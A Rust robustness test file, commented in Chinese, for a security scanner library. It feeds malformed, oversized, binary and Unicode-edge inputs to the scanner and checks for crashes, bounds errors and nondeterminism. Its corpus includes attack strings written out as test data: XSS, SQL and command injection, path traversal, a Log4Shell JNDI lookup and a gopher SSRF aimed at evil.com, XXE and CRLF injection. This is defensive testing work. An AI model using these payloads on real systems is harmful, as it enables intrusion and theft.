// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

//! 鲁棒性语料：把畸形 / 极端 / 二进制样输入整批灌进 `Scanner`，
//! 只断言「不崩、不越界、自洽、确定」，不断言任何业务命中与否。
//!
//! 这类测试的价值在于**没有任何输入是预先想好会命中的**：正则引擎在病态输入上
//! panic、某检测器产生越界 `offset`，都会在这里炸出来。语料全部是确定性构造，
//! 不使用系统时间 / 随机源，失败必然可复现。

use security_rust::Scanner;
use std::time::{Duration, Instant};

/// 整个语料的宽松耗时上限。只用来拦「灾难性回溯 / 指数级爆炸」这种量级的问题，
/// 不是性能基准 —— 不要把阈值调紧，CI 机器差异会造成假红。
/// 本地 debug 构建实测 ~11s，留了 5 倍余量给慢机器 / coverage 插桩。
const BUDGET: Duration = Duration::from_secs(60);

/// 已知攻击串：不做命中断言，只用来派生变形（截断 / 反转 / 大小写 / 编码）。
const ATTACKS: &[&str] = &[
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "' OR '1'='1' --",
    "1 UNION SELECT password FROM users",
    "1; DROP TABLE users",
    "1 AND SLEEP(5)",
    "; cat /etc/passwd",
    "| whoami",
    "$(id)",
    "`id`",
    "../../../etc/passwd",
    "..\\..\\windows\\system32\\config",
    "${jndi:ldap://evil.com/a}",
    "${7*7}",
    "{{7*7}}",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
    "javascript:alert(document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "gopher://evil.com/_GET / HTTP/1.1",
    "http://169.254.169.254/latest/meta-data/",
    "Host: 127.0.0.1",
    "Transfer-Encoding: chunked",
    "Access-Control-Allow-Origin: *",
    "ws://evil.com/socket",
    "origin: null",
    "%0d%0aSet-Cookie: evil=true",
    "=cmd|' /C calc'!A0",
    "+1+1+cmd|' /C calc'!A0",
    "{\"__proto__\":{\"polluted\":1}}",
    "O:8:\"stdClass\":1:{}",
    "rO0ABXNyABFqYXZh",
    "@evil.com\r\nBcc: victim",
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
    "(a+)+$",
    "%{100000000}",
];

/// 派生变形：原串 / 截断 / 反转 / 全大写 / 全小写 / 夹 NUL / 大小写翻转 / 百分号编码。
fn variants(base: &str) -> Vec<String> {
    let chars: Vec<char> = base.chars().collect();
    vec![
        base.to_string(),
        chars.iter().take(chars.len() / 2).collect(),
        chars.iter().rev().collect(),
        base.to_uppercase(),
        base.to_lowercase(),
        base.chars().flat_map(|c| [c, '\0']).collect(),
        base.chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            })
            .collect(),
        base.bytes().map(|b| format!("%{b:02X}")).collect(),
    ]
}

/// 畸形 / 极端输入语料。条数由 `corpus_is_non_trivial` 校验，只增不减。
fn corpus() -> Vec<String> {
    let mut v: Vec<String> = Vec::new();

    // 空与空白
    for s in ["", " ", "\t\n\r", "\u{3000}\u{3000}", "\r\n\r\n", "   \t  \n"] {
        v.push(s.to_string());
    }

    // 超长：单字符 10 万次 / 长 base64 / 长 JSON / 长重复结构
    v.push("a".repeat(100_000));
    v.push("<".repeat(100_000));
    v.push("'".repeat(100_000));
    v.push(" ".repeat(100_000));
    v.push("../".repeat(33_333));
    v.push("%0d%0a".repeat(20_000));
    v.push("Host: 127.0.0.1\r\n".repeat(10_000));
    v.push("QUJD".repeat(25_000));
    v.push("{\"k\":\"v\",\"n\":[1,2,3]},".repeat(5_000));

    // 截断的编码 / 编码残片
    for s in [
        "%", "%0", "%0d", "%zz", "%%", "%u0027", "%c0%ae%c0%ae", "&#", "&#x", "&#xZZ;", "&#x27",
        "&amp", "&lt", "\\u{", "\\u00", "\\x", "\\xZZ", "\\", "\\\\", "\\u{110000}",
    ] {
        v.push(s.to_string());
    }

    // 正则元字符炸弹
    for s in [
        "(".repeat(1000),
        "[".repeat(1000),
        "\\".repeat(1000),
        "^".repeat(1000),
        "$".repeat(1000),
        "|".repeat(5000),
        "(?:".repeat(500),
        "(?P<".repeat(500),
        "(?<=".repeat(500),
        "(?i)".repeat(1000),
        "(a+)+".repeat(500),
        "(a|a)*".repeat(500),
        ".*.*.*.*".repeat(200),
        "[a-".repeat(300),
        "\\p{".repeat(300),
        "a|".repeat(5000) + "a",
    ] {
        v.push(s);
    }

    // 深层嵌套
    for s in [
        "[".repeat(1000) + &"]".repeat(1000),
        "{a:".repeat(500) + &"}".repeat(500),
        "<div>".repeat(1000),
        "<script>".repeat(1000),
        "<!--".repeat(1000),
        "<![CDATA[".repeat(500),
        "${".repeat(1000),
        "&#".repeat(1000) + ";",
    ] {
        v.push(s);
    }

    // Unicode 边界 / 控制符
    for s in [
        "\u{1F600}\u{1F600}\u{1F600}",
        "e\u{0301}\u{0301}\u{0301}",
        "abc\u{202E}def",
        "\u{200B}\u{200B}\u{200B}",
        "\u{FEFF}hello",
        "a\0b\0c",
        "\u{FFFD}\u{FFFD}",
        "こんにちは世界 你好 مرحبا",
        "\u{1D525}\u{1D52E}",
        "<\u{1F600}>",
    ] {
        v.push(s.to_string());
    }

    // 不完整 UTF-8 / lone surrogate 的 WTF-8 形态：只能用字节构造，lossy 之后仍要安全
    for bytes in [
        &[0xF0u8, 0x9F][..],
        &[0xC3][..],
        &[0xE2, 0x82][..],
        &[0xED, 0xA0, 0x80][..], // U+D800 lone surrogate
        &[0xED, 0xBF, 0xBF][..], // U+DFFF lone surrogate
        &[0xC0, 0xAF][..],       // overlong
        &[0xF5, 0x80, 0x80, 0x80][..],
        &[0x80, 0x80, 0x80][..], // 孤立续接字节
    ] {
        v.push(String::from_utf8_lossy(bytes).into_owned());
    }

    // 二进制样：0x00-0xFF 逐字节，以及全字节序列
    let all: Vec<u8> = (0u8..=255).collect();
    for b in 0u8..=255 {
        v.push(String::from_utf8_lossy(&[b]).into_owned());
    }
    v.push(String::from_utf8_lossy(&all).into_owned());
    v.push(String::from_utf8_lossy(&all.repeat(8)).into_owned());

    // 协议样
    v.push("GET / HTTP/1.1\r\nHost: a\r\n\r\n".to_string());
    v.push("\r\n".to_string());
    v.push("\r\n\r\n\r\n".to_string());
    v.push("GET".to_string());
    v.push("\0\0\0".to_string());
    v.push("HTTP/1.1 200 OK\r\n\r\n".to_string());
    v.push(format!(
        "GET / HTTP/1.1\r\nX-Pad: {}\r\n\r\n",
        "A".repeat(100_000)
    ));

    // 已知攻击串的变形
    for base in ATTACKS {
        v.extend(variants(base));
    }

    v
}

/// 单条输入的全部断言：越界 / 自洽 / assess 一致 / 确定性。
fn assert_scan_invariants(scanner: &Scanner, input: &str) {
    let results = scanner.scan(input);
    for r in &results {
        let len = r.matched_pattern.len();
        let end = r.offset + len;
        assert!(
            end <= input.len(),
            "offset {} + len {} = {} 越界（input.len() = {}）",
            r.offset,
            len,
            end,
            input.len()
        );
        assert_eq!(
            &input[r.offset..end],
            r.matched_pattern,
            "offset 与 matched_pattern 不自洽: attack_type={} input={:?}",
            r.attack_type,
            preview(input)
        );
        assert!(!r.attack_type.is_empty(), "attack_type 为空");
        assert!(!r.message.is_empty(), "message 为空");
    }

    // assess 必须与 scan 一致，且自身不 panic
    assert_eq!(
        scanner.assess(input).results,
        results.len(),
        "assess.results 与 scan 长度不一致: input={:?}",
        preview(input)
    );

    // 确定性：同输入两遍结果（含顺序）完全相同
    assert_eq!(
        scanner.scan(input),
        results,
        "同一输入两次扫描结果不同: input={:?}",
        preview(input)
    );
}

fn preview(input: &str) -> String {
    let head: String = input.chars().take(40).collect();
    if input.chars().count() > 40 {
        format!("{head}…({} chars)", input.chars().count())
    } else {
        head
    }
}

#[test]
fn corpus_never_panics_or_produces_out_of_bounds_offsets() {
    let scanner = Scanner::default();
    let corpus = corpus();
    let start = Instant::now();

    for (i, input) in corpus.iter().enumerate() {
        assert_scan_invariants(&scanner, input);
        // 每 64 条检查一次预算，卡死时能直接指出是哪条输入拖垮的
        if i % 64 == 0 && start.elapsed() > BUDGET {
            panic!(
                "第 {i} 条输入后已耗时 {:?}（预算 {BUDGET:?}），疑似灾难性回溯。输入={}",
                start.elapsed(),
                preview(input)
            );
        }
    }

    let elapsed = start.elapsed();
    println!("语料 {} 条，总耗时 {elapsed:?}", corpus.len());
    assert!(
        elapsed < BUDGET,
        "语料 {} 条耗时 {elapsed:?} 超过预算 {BUDGET:?}",
        corpus.len()
    );
}

#[test]
fn corpus_is_non_trivial() {
    let corpus = corpus();
    assert!(
        corpus.len() >= 500,
        "语料只剩 {} 条，覆盖被削掉了",
        corpus.len()
    );
    assert!(corpus.iter().any(|s| s.is_empty()), "缺少空串");
    assert!(corpus.iter().any(|s| s.chars().count() > 50_000), "缺少超长输入");
    assert!(
        corpus.iter().any(|s| s.contains('\0')),
        "缺少 NUL 字节输入"
    );
    assert!(
        corpus.iter().any(|s| s.contains('\u{FFFD}')),
        "缺少无效 UTF-8 lossy 输入"
    );
}

/// 语料里必须有相当数量的输入能打中检测器 —— 否则上面的不变量检查会退化成空转，
/// 一个「所有检测器都返回 None」的坏版本也能全绿。
#[test]
fn corpus_actually_triggers_detectors() {
    let scanner = Scanner::default();
    let hits: usize = corpus().iter().map(|i| scanner.scan(i).len()).sum();
    assert!(
        hits >= 200,
        "整个语料只产生 {hits} 条命中，不变量检查已退化为空转"
    );
}
